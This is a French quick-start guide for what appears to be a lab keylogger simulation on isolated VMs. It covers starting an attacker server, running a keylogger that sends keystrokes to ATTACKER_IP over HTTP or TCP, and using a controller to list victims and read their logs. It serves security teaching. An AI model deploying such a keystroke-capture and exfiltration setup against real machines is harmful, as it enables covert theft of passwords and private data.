# Démarrage Rapide - Simulation Keylogger

## ⚡ Quick Start (5 minutes)

### Prérequis
- 2 VMs VirtualBox configurées en réseau interne
- Python 3.8+ installé sur les deux VMs
- IP de la VM Attaquant connue (ex: 192.168.56.101)

---

## 🚀 Étapes Rapides

### 1. VM Attaquant (Terminal 1)

```bash
# Transférer le dossier attaquant dans la VM
cd attaquant
pip3 install -r requirements.txt
python3 server.py
```

**✅ Attendu :** Message "Serveur HTTP..." et "Serveur TCP en écoute..."

---

### 2. VM Victime (Terminal 2)

```bash
# Transférer le dossier victime dans la VM
cd victime

# Modifier config.py avec l'IP de l'attaquant
nano config.py  # ou votre éditeur préféré
# ATTACKER_IP = "192.168.56.101"

pip3 install -r requirements.txt
python3 keylogger.py
```

**✅ Attendu :** Message "Keylogger initialisé" et "Capture démarrée"

**💡 Astuce :** Taper quelques caractères pour générer des logs

---

### 3. Contrôleur (Terminal 3 - n'importe où)

```bash
# Transférer le dossier controleur
cd controleur

# Modifier config.py avec l'IP de l'attaquant
nano config.py
# ATTACKER_IP = "192.168.56.101"

pip3 install -r requirements.txt
python3 controller.py
```

**✅ Attendu :** Menu du contrôleur avec prompt `controleur>`

---

## 📝 Commandes Essentielles

Dans le contrôleur :

```bash
list                                    # Voir les victimes
logs <victim_id>                        # Voir les logs
analyze <victim_id>                     # Analyser les logs
exit                                    # Quitter
```

**Exemple :**
```bash
controleur> list
controleur> logs 550e8400-e29b-41d4-a716-446655440000
controleur> analyze 550e8400-e29b-41d4-a716-446655440000
```

---

## 🔧 Configuration Minimale

### victime/config.py
```python
ATTACKER_IP = "192.168.56.101"  # ← MODIFIER ICI
ATTACKER_PORT = 8080
EXFILTRATION_MODE = "http"
```

### controleur/config.py
```python
ATTACKER_IP = "192.168.56.101"  # ← MODIFIER ICI
ATTACKER_PORT = 8080
```

### attaquant/config.py
```python
# Généralement pas besoin de modifier
HTTP_PORT = 8080
TCP_PORT = 9999
```

---

## ⚠️ Problèmes Courants

### "Connection refused" ou "Impossible de se connecter"

1. Vérifier que le serveur attaquant est démarré
2. Vérifier l'IP dans les fichiers config.py
3. Vérifier le firewall :
   ```bash
   sudo ufw allow 8080
   sudo ufw allow 9999
   ```

### "Module not found"

```bash
pip3 install -r requirements.txt
```

### Keylogger ne capture rien (Linux)

```bash
sudo apt install python3-dev libx11-dev
# Ou exécuter avec sudo (non recommandé)
```

---

## 📊 Vérification Rapide

### Le système fonctionne si :

1. ✅ Le serveur attaquant affiche : `[+] X logs reçus de <victim_id>`
2. ✅ Le contrôleur peut lister les victimes avec `list`
3. ✅ Les logs s'affichent avec `logs <victim_id>`

---

## 🎯 Test Complet (30 secondes)

1. Démarrer le serveur attaquant
2. Démarrer le keylogger
3. Taper "Hello World" dans la VM Victime
4. Attendre 2-3 secondes
5. Dans le contrôleur : `list` puis `logs <id>`
6. Vous devriez voir "Hello World" dans les logs

---

## 📚 Documentation Complète

Pour plus de détails, consultez :
- `GUIDE_ETAPES.md` : Guide détaillé étape par étape
- `ARCHITECTURE.md` : Architecture technique complète
- `README.md` : Vue d'ensemble du projet

---

## 💡 Astuces

- **Plusieurs victimes** : Démarrer plusieurs instances du keylogger
- **Mode TCP** : Changer `EXFILTRATION_MODE = "tcp"` dans victime/config.py
- **Logs locaux** : Consulter le dossier `logs/` sur la VM Attaquant
- **Arrêt propre** : Ctrl+C sur chaque terminal pour arrêter proprement

